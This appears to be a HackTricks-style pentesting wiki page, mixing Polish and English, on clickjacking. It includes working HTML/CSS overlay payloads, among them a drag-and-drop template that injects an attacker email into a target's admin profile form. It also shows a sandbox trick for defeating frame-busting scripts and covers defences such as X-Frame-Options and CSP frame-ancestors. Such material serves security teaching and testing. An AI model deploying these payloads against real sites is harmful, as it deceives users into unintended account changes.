# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Co to jest Clickjacking

W ataku clickjacking **użytkownik** zostaje **oszukany**, aby **kliknąć** w **element** na stronie, który jest albo **niewidoczny**, albo podszywa się pod inny element. Taka manipulacja może prowadzić do niezamierzonych konsekwencji dla użytkownika, takich jak pobranie malware, przekierowanie na złośliwe strony, ujawnienie poświadczeń lub danych wrażliwych, przelewy pieniędzy lub dokonanie zakupów online.

### Prepopulate forms trick

Czasami możliwe jest **wypełnienie wartości pól formularza za pomocą parametrów GET podczas ładowania strony**. Atakujący może wykorzystać to zachowanie, żeby wypełnić formularz dowolnymi danymi i wysłać clickjacking payload, tak że użytkownik naciśnie przycisk Submit.

### Populate form with Drag\&Drop

Jeśli potrzebujesz, aby **użytkownik wypełnił formularz**, ale nie chcesz bezpośrednio prosić go o wpisanie konkretnych informacji (np. adresu email lub konkretnego hasła, które znasz), możesz poprosić go, aby po prostu **Drag\&Drop** czegoś, co wpisze kontrolowane przez ciebie dane, jak w [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Wieloetapowy Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

If you have identified an **XSS attack that requires a user to click** on some element to **trigger** the XSS and the page is **vulnerable to clickjacking**, you could abuse it to trick the user into clicking the button/link.\
Example:\
You found a **self XSS** in some private details of the account (details that **only you can set and read**). The page with the **form** to set these details is **vulnerable** to **Clickjacking** and you can **prepopulate** the **form** with the GET parameters.\
An attacker could prepare a **Clickjacking** attack to that page **prepopulating** the **form** with the **XSS payload** and **tricking** the **user** into **Submit** the form. So, **when the form is submitted** and the values are modified, the **user will execute the XSS**.

### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), this technique would ask the victim to double click on a button of a custom page placed in a specific location, and use the timing differences between mousedown and onclick events to load the victim page duing the double click so the **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> This technique allows to trick the user to click on 1 place in the victim page bypassing every protection against clickjacking. So the attacker needs to find **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions**.

### Browser extensions: DOM-based autofill clickjacking

Aside from iframing victim pages, attackers can target browser extension UI elements that are injected into the page. Password managers render autofill dropdowns near focused inputs; by focusing an attacker-controlled field and hiding/occluding the extension’s dropdown (opacity/overlay/top-layer tricks), a coerced user click can select a stored item and fill sensitive data into attacker-controlled inputs. This variant requires no iframe exposure and works entirely via DOM/CSS manipulation.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Skrypty uruchamiane po stronie klienta mogą wykonywać działania zapobiegające Clickjacking:

- Zapewnienie, że okno aplikacji jest głównym lub najwyższym oknem.
- Uczynienie wszystkich frame'ów widocznymi.
- Zapobieganie kliknięciom w niewidoczne frame'y.
- Wykrywanie i powiadamianie użytkowników o potencjalnych próbach Clickjacking.

Jednak skrypty typu frame-busting można obejść:

- **Browsers' Security Settings:** Niektóre przeglądarki mogą blokować te skrypty w zależności od ustawień bezpieczeństwa lub braku wsparcia dla JavaScript.
- **HTML5 iframe sandbox Attribute:** An attacker can neutralize frame buster scripts by setting the sandbox attribute with allow-forms or allow-scripts values without allow-top-navigation. This prevents the iframe from verifying if it is the top window, e.g.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Wartości allow-forms i allow-scripts umożliwiają akcje wewnątrz <iframe>, jednocześnie wyłączając nawigację najwyższego poziomu. Aby zapewnić zamierzoną funkcjonalność docelowej strony, mogą być potrzebne dodatkowe uprawnienia, takie jak allow-same-origin i allow-modals, w zależności od rodzaju ataku. Komunikaty konsoli przeglądarki mogą wskazać, którym uprawnieniom należy zezwolić.

### Server-Side Defenses

#### X-Frame-Options

The **X-Frame-Options HTTP response header** informuje przeglądarki o tym, czy renderowanie strony w <frame> lub <iframe> jest dopuszczalne, pomagając zapobiegać Clickjacking:

- X-Frame-Options: deny - Żadna domena nie może osadzać zawartości.
- X-Frame-Options: sameorigin - Tylko ta sama witryna może osadzać zawartość.
- X-Frame-Options: allow-from https://trusted.com - Tylko określony 'uri' może osadzać stronę.
- Zwróć uwagę na ograniczenia: jeśli przeglądarka nie obsługuje tej dyrektywy, może ona nie zadziałać. Niektóre przeglądarki preferują dyrektywę CSP frame-ancestors.

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** jest zalecaną metodą ochrony przed Clickjacking:

- frame-ancestors 'none' - Podobne do X-Frame-Options: deny.
- frame-ancestors 'self' - Podobne do X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Podobne do X-Frame-Options: allow-from.

Na przykład, poniższy CSP pozwala na osadzanie tylko z tej samej domeny:

Content-Security-Policy: frame-ancestors 'self';

Szczegółowe informacje i bardziej złożone przykłady można znaleźć w [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) oraz w [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with child-src and frame-src

**Content Security Policy (CSP)** to środek bezpieczeństwa, który pomaga zapobiegać Clickjackingowi i innym atakom polegającym na wstrzyknięciu kodu, poprzez określenie, z jakich źródeł przeglądarka powinna pozwalać na ładowanie zawartości.

#### frame-src Directive

- Określa prawidłowe źródła dla frame'ów.
- Bardziej specyficzna niż dyrektywa default-src.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ta polityka zezwala na osadzanie ramek z tego samego origin (self) oraz https://trusted-website.com.

#### Dyrektywa child-src

- Wprowadzona w CSP level 2 w celu określenia dopuszczalnych źródeł dla web workers i frames.
- Służy jako fallback dla frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ta polityka zezwala na ramki i workery z tej samej domeny (self) oraz https://trusted-website.com.

**Uwagi dotyczące użycia:**

- Wycofywanie: child-src jest stopniowo usuwane na rzecz frame-src i worker-src.
- Zachowanie zapasowe: Jeśli frame-src jest nieobecne, child-src jest używane jako zapas dla ramek. Jeśli oba są nieobecne, używane jest default-src.
- Ścisłe określenie źródeł: Uwzględnij tylko zaufane źródła w dyrektywach, aby zapobiec wykorzystaniu.

#### JavaScript: skrypty blokujące osadzanie w ramkach

Chociaż nie są całkowicie niezawodne, skrypty oparte na JavaScript mające na celu zapobieganie osadzaniu w ramkach mogą być użyte do uniemożliwienia umieszczenia strony w ramce. Przykład:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Stosowanie Anti-CSRF Tokens

- **Weryfikacja tokenów:** Używaj anti-CSRF tokens w aplikacjach webowych, aby upewnić się, że żądania zmieniające stan są wykonywane świadomie przez użytkownika, a nie przez Clickjacked stronę.

## Źródła

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
